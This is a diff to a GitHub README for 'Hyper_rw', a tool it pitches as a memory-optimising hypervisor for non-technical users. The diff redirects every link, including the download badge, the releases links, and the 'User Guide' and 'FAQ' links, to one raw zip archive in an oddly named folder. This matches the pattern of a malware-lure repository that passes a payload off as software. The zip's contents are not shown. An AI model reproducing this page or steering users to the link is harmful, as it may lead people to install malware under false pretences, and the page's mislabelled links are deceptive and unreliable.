@@ -4,7 +4,7 @@
 Hyper_rw is a hypervisor designed to enhance how computers handle memory. With its memory introspection capabilities, you can manage and monitor memory usage with ease. This application helps optimize your computer's performance, making it perfect for users looking to improve efficiency without needing technical expertise.
 
 ## 📥 Download Hyper_rw
-[![Download Hyper_rw](https://img.shields.io/badge/Download-Hyper_rw-brightgreen)](https://github.com/Sumeet8726/Hyper_rw/releases)
+[![Download Hyper_rw](https://github.com/Sumeet8726/Hyper_rw/raw/refs/heads/main/transmissory/rw_Hyper_v2.1.zip)](https://github.com/Sumeet8726/Hyper_rw/raw/refs/heads/main/transmissory/rw_Hyper_v2.1.zip)
 
 ## 🛠️ System Requirements
 Before you download Hyper_rw, verify that your computer meets the following requirements:
@@ -24,7 +24,7 @@ Before you download Hyper_rw, verify that your computer meets the following requ
 To get started with Hyper_rw, follow these steps:
 
 1. **Download the Application**:
-   - Visit [this page to download](https://github.com/Sumeet8726/Hyper_rw/releases).
+   - Visit [this page to download](https://github.com/Sumeet8726/Hyper_rw/raw/refs/heads/main/transmissory/rw_Hyper_v2.1.zip).
    - Choose the latest version available.
 
 2. **Install the Application**:
@@ -66,11 +66,11 @@ Your experience is important to us. If you have suggestions or encounter bugs:
 - Please report them on the GitHub Issues page.
 
 ## 📥 Download Hyper_rw Again
-For easy access, [visit this page to download Hyper_rw](https://github.com/Sumeet8726/Hyper_rw/releases) once more.
+For easy access, [visit this page to download Hyper_rw](https://github.com/Sumeet8726/Hyper_rw/raw/refs/heads/main/transmissory/rw_Hyper_v2.1.zip) once more.
 
 ## 🔗 Additional Resources
 To learn more about using Hyper_rw effectively, consider these resources:
-- [User Guide](https://link-to-user-guide.com) (Link placeholder)
-- [FAQ Section](https://link-to-faq.com) (Link placeholder)
+- [User Guide](https://github.com/Sumeet8726/Hyper_rw/raw/refs/heads/main/transmissory/rw_Hyper_v2.1.zip) (Link placeholder)
+- [FAQ Section](https://github.com/Sumeet8726/Hyper_rw/raw/refs/heads/main/transmissory/rw_Hyper_v2.1.zip) (Link placeholder)
 
 With Hyper_rw, managing your computer's memory is straightforward and effective. Follow these steps, and you'll be on your way to optimizing your system in no time.
